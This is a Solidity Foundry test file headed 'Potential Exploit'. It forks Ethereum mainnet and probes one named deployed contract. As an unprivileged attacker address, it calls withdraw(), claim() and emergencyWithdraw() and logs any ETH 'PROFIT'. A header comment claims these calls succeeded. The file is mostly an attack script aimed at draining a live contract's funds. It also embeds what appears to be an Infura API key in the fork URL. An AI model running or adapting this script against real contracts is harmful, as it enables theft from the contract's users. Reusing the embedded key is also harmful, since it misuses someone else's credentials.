// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title Potential Exploit
 * @notice 0x20e4d327573158743FCf1f624b4dF90D1EA2cb04 - withdraw/claim/emergencyWithdraw succeeded
 */
contract PotentialExploitTest is Test {

    address target;
    address attacker;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
        target = vm.parseAddress("0x20e4d327573158743FCf1f624b4dF90D1EA2cb04");
        attacker = address(0xBEEF);
    }

    function test_analyzeTarget() public {
        console.log("=== ANALYZING 0x20e4d327... ===");
        console.log("Target ETH:", target.balance / 1e18);

        // Check what contract this is
        (bool s, bytes memory d) = target.staticcall(abi.encodeWithSignature("name()"));
        if (s && d.length > 0) {
            try this.decodeName(d) returns (string memory name) {
                console.log("Name:", name);
            } catch {}
        }

        (s, d) = target.staticcall(abi.encodeWithSignature("owner()"));
        if (s && d.length >= 32) {
            address owner = abi.decode(d, (address));
            console.log("Owner:", owner);
        }

        // Check proxy implementation
        bytes32 implSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        bytes32 impl = vm.load(target, implSlot);
        if (uint256(impl) != 0) {
            console.log("Implementation:", address(uint160(uint256(impl))));
        }

        // Check various balances and state
        (s, d) = target.staticcall(abi.encodeWithSignature("totalSupply()"));
        if (s && d.length >= 32) {
            console.log("Total Supply:", abi.decode(d, (uint256)));
        }

        (s, d) = target.staticcall(abi.encodeWithSignature("balance()"));
        if (s && d.length >= 32) {
            console.log("Contract balance():", abi.decode(d, (uint256)));
        }

        (s, d) = target.staticcall(abi.encodeWithSignature("rewardToken()"));
        if (s && d.length >= 32) {
            console.log("Reward Token:", abi.decode(d, (address)));
        }
    }

    function test_exploitWithdraw() public {
        console.log("=== EXPLOIT ATTEMPT: withdraw() ===");

        uint256 targetBefore = target.balance;
        uint256 attackerBefore = attacker.balance;

        console.log("Target ETH before:", targetBefore / 1e18);
        console.log("Attacker ETH before:", attackerBefore / 1e18);

        vm.startPrank(attacker);

        (bool s,) = target.call(abi.encodeWithSignature("withdraw()"));
        console.log("withdraw() result:", s ? "SUCCESS" : "FAILED");

        vm.stopPrank();

        uint256 targetAfter = target.balance;
        uint256 attackerAfter = attacker.balance;

        console.log("Target ETH after:", targetAfter / 1e18);
        console.log("Attacker ETH after:", attackerAfter / 1e18);

        if (attackerAfter > attackerBefore) {
            console.log("!!! PROFIT:", (attackerAfter - attackerBefore) / 1e18, "ETH");
        } else {
            console.log("No ETH gained");
        }

        if (targetAfter < targetBefore) {
            console.log("Target lost:", (targetBefore - targetAfter) / 1e18, "ETH");
        }
    }

    function test_exploitClaim() public {
        console.log("=== EXPLOIT ATTEMPT: claim() ===");

        uint256 targetBefore = target.balance;
        uint256 attackerBefore = attacker.balance;

        console.log("Target ETH before:", targetBefore / 1e18);
        console.log("Attacker ETH before:", attackerBefore / 1e18);

        vm.startPrank(attacker);

        (bool s,) = target.call(abi.encodeWithSignature("claim()"));
        console.log("claim() result:", s ? "SUCCESS" : "FAILED");

        vm.stopPrank();

        uint256 attackerAfter = attacker.balance;

        if (attackerAfter > attackerBefore) {
            console.log("!!! PROFIT:", (attackerAfter - attackerBefore) / 1e18, "ETH");
        } else {
            console.log("No ETH gained");
        }
    }

    function test_exploitEmergencyWithdraw() public {
        console.log("=== EXPLOIT ATTEMPT: emergencyWithdraw() ===");

        uint256 targetBefore = target.balance;
        uint256 attackerBefore = attacker.balance;

        console.log("Target ETH before:", targetBefore / 1e18);
        console.log("Attacker ETH before:", attackerBefore / 1e18);

        vm.startPrank(attacker);

        (bool s,) = target.call(abi.encodeWithSignature("emergencyWithdraw()"));
        console.log("emergencyWithdraw() result:", s ? "SUCCESS" : "FAILED");

        vm.stopPrank();

        uint256 attackerAfter = attacker.balance;

        if (attackerAfter > attackerBefore) {
            console.log("!!! PROFIT:", (attackerAfter - attackerBefore) / 1e18, "ETH");
        } else {
            console.log("No ETH gained");
        }
    }

    function test_checkWithdrawableBalance() public {
        console.log("=== CHECKING WITHDRAWABLE BALANCE ===");

        // Check if there's a balance/deposits mapping for attacker
        (bool s, bytes memory d) = target.staticcall(
            abi.encodeWithSignature("balanceOf(address)", attacker)
        );
        if (s && d.length >= 32) {
            console.log("Attacker balanceOf:", abi.decode(d, (uint256)));
        }

        (s, d) = target.staticcall(
            abi.encodeWithSignature("deposits(address)", attacker)
        );
        if (s && d.length >= 32) {
            console.log("Attacker deposits:", abi.decode(d, (uint256)));
        }

        (s, d) = target.staticcall(
            abi.encodeWithSignature("pendingRewards(address)", attacker)
        );
        if (s && d.length >= 32) {
            console.log("Attacker pending rewards:", abi.decode(d, (uint256)));
        }

        (s, d) = target.staticcall(
            abi.encodeWithSignature("claimable(address)", attacker)
        );
        if (s && d.length >= 32) {
            console.log("Attacker claimable:", abi.decode(d, (uint256)));
        }
    }

    function decodeName(bytes memory data) external pure returns (string memory) {
        return abi.decode(data, (string));
    }
}
